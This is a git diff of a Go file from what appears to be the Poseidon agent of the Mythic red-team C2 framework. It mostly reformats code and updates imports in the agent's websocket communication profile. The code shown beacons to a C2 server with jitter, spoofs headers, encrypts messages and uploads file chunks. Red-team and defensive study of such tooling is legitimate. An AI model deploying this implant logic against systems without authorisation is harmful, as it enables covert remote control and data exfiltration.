@@ -1,10 +1,13 @@
 // +build websocket
 
+// This file is copied to pkg/profiles/ directory when Poseidon is built using the websocket profile at https://github.com/MythicC2Profiles/websocket
+
 package profiles
 
 import (
 	"bytes"
 	"crypto/rsa"
+	"crypto/tls"
 	"encoding/base64"
 	"encoding/json"
 	"fmt"
@@ -13,15 +16,16 @@ import (
 	"os"
 	"reflect"
 	"strings"
-	"time"
 	"sync"
-	"crypto/tls"
-	//"log"
+	"time"
 
+	// 3rd Party
 	"github.com/gorilla/websocket"
-	"pkg/utils/crypto"
-	"pkg/utils/functions"
-	"pkg/utils/structs"
+
+	// Poseidon
+	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/crypto"
+	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/functions"
+	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/structs"
 )
 
 var mu sync.Mutex
@@ -57,7 +61,7 @@ func newProfile() Profile {
 }
 
 func (c C2Websockets) getSleepTime() int{
-    return c.Interval + int(math.Round((float64(c.Interval) * (seededRand.Float64() * float64(c.Jitter))/float64(100.0))));
+	return c.Interval + int(math.Round((float64(c.Interval) * (seededRand.Float64() * float64(c.Jitter))/float64(100.0))));
 }
 
 func (c C2Websockets) SleepInterval() int {
@@ -69,7 +73,7 @@ func (c *C2Websockets) SetSleepInterval(interval int) {
 }
 
 func (c *C2Websockets) SetSleepJitter(jitter int){
-    c.Jitter = jitter
+	c.Jitter = jitter
 }
 
 func (c C2Websockets) ApfID() string {
@@ -120,7 +124,7 @@ func (c *C2Websockets) CheckIn(ip string, pid int, user string, host string, ope
 	//log.Printf(url)
 	header := make(http.Header)
 	header.Set("User-Agent", c.UserAgent)
-	
+
 	// Set the host header
 	if (len(c.HostHeader) > 0) {
 		header.Set("Host", c.HostHeader)
@@ -132,15 +136,15 @@ func (c *C2Websockets) CheckIn(ip string, pid int, user string, host string, ope
 		},
 	}
 	for true {
-        connection, _, err := d.Dial(url, header)
-        if err != nil {
-            //log.Printf("Error connecting to server %s ", err.Error())
-            //return structs.CheckInMessageResponse{Action: "checkin", Status: "failed"}
-            time.Sleep(time.Duration(c.getSleepTime()) * time.Second);
-            continue
-        }
-        c.Conn = connection
-        break
+		connection, _, err := d.Dial(url, header)
+		if err != nil {
+			//log.Printf("Error connecting to server %s ", err.Error())
+			//return structs.CheckInMessageResponse{Action: "checkin", Status: "failed"}
+			time.Sleep(time.Duration(c.getSleepTime()) * time.Second);
+			continue
+		}
+		c.Conn = connection
+		break
 	}
 
 	//log.Println("Connected to server ")
@@ -372,7 +376,7 @@ func (c *C2Websockets) SendFileChunks(task structs.Task, fileData []byte, ch cha
 		}
 	}
 
-	
+
 	r := bytes.NewBuffer(fileData)
 	// Sleep here so we don't spam apfell
 	//time.Sleep(time.Duration(c.getSleepTime()) * time.Second);
@@ -401,7 +405,7 @@ func (c *C2Websockets) SendFileChunks(task structs.Task, fileData []byte, ch cha
 		for {
 			decResp := <-ch
 			err := json.Unmarshal(decResp, &postResp)// Wait for a response for our file chunk
-		
+
 			if err != nil {
 				errResponse := structs.Response{}
 				errResponse.Completed = true
@@ -428,7 +432,7 @@ func (c *C2Websockets) SendFileChunks(task structs.Task, fileData []byte, ch cha
 
 		if !strings.Contains(postResp["status"].(string), "success") {
 			// If the post was not successful, wait and try to send it one more time
-			
+
 			mu.Lock()
 			TaskResponses = append(TaskResponses, encmsg)
 			mu.Unlock()
@@ -497,7 +501,7 @@ func (c *C2Websockets) NegotiateKey() string {
 
 }
 func (c *C2Websockets) reconnect(){
-    header := make(http.Header)
+	header := make(http.Header)
 	header.Set("User-Agent", c.UserAgent)
 	if (len(c.HostHeader) > 0) {
 		header.Set("Host", c.HostHeader)
@@ -508,26 +512,26 @@ func (c *C2Websockets) reconnect(){
 		},
 	}
 	url := fmt.Sprintf("%s%s", c.BaseURL, c.Endpoint)
-    for true {
-        connection, _, err := d.Dial(url, header)
-        if err != nil {
-            //log.Printf("Error connecting to server %s ", err.Error())
-            //return structs.CheckInMessageResponse{Action: "checkin", Status: "failed"}
-            time.Sleep(time.Duration(c.getSleepTime()) * time.Second);
-            continue
-        }
-        c.Conn = connection
-        break
+	for true {
+		connection, _, err := d.Dial(url, header)
+		if err != nil {
+			//log.Printf("Error connecting to server %s ", err.Error())
+			//return structs.CheckInMessageResponse{Action: "checkin", Status: "failed"}
+			time.Sleep(time.Duration(c.getSleepTime()) * time.Second);
+			continue
+		}
+		c.Conn = connection
+		break
 	}
 }
 func (c *C2Websockets) sendData(tag string, sendData []byte) []byte {
 	m := structs.Message{}
-    if len(c.Key) != 0 {
-        sendData = c.encryptMessage(sendData)
-    }
+	if len(c.Key) != 0 {
+		sendData = c.encryptMessage(sendData)
+	}
 
-    sendData = append([]byte(c.ApfellID), sendData...)
-    sendData = []byte(base64.StdEncoding.EncodeToString(sendData))
+	sendData = append([]byte(c.ApfellID), sendData...)
+	sendData = []byte(base64.StdEncoding.EncodeToString(sendData))
 	for true{
 		m.Client = true
 		m.Data = string(sendData)
@@ -535,20 +539,20 @@ func (c *C2Websockets) sendData(tag string, sendData []byte) []byte {
 		//log.Printf("Sending message %+v\n", m)
 		err := c.Conn.WriteJSON(m)
 		if err != nil {
-		    //log.Printf("%v", err);
-		    c.reconnect()
+			//log.Printf("%v", err);
+			c.reconnect()
 			continue
 		}
 		// Read the response
 		resp := structs.Message{}
 		err = c.Conn.ReadJSON(&resp)
-	
+
 		if err != nil {
 			//log.Println("Error trying to read message ", err.Error())
 			c.reconnect()
 			continue
 		}
-	
+
 		raw, err := base64.StdEncoding.DecodeString(resp.Data)
 		if err != nil {
 			//log.Println("Error decoding base64 data: ", err.Error())
@@ -556,25 +560,25 @@ func (c *C2Websockets) sendData(tag string, sendData []byte) []byte {
 		}
 
 		if len(raw) < 36 {
-		    //log.Println("length of data < 36")
+			//log.Println("length of data < 36")
 			time.Sleep(time.Duration(c.getSleepTime()) * time.Second);
-            continue
+			continue
 		}
-	
+
 		enc_raw := raw[36:] // Remove the Payload UUID
-	
+
 		if len(c.Key) != 0 {
 			//log.Printf("Decrypting data")
 			enc_raw = c.decryptMessage(enc_raw)
 			if len(enc_raw) == 0 {
 				time.Sleep(time.Duration(c.getSleepTime()) * time.Second);
-                continue
+				continue
 			}
 		}
-	
+
 		return enc_raw
 	}
-	
+
 	return make([]byte, 0)
 }
 
